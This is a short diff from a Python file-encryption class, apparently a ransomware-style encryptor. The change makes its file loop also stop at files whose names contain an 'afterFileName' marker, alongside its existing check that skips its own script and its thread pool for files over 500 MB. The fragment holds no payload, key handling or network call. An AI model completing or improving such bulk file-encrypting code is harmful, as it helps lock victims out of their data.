@@ -76,7 +76,7 @@ class Encryptor:
         try:
             for file in self._files:
                 if(os.path.isfile(file)==True):
-                    if(file==sys.argv[0]):
+                    if(file==sys.argv[0] or afterFileName in file):
                         return
                     if(os.path.getsize(file)>500000000):
                         if (len(ThreadPool)<MaxThread):
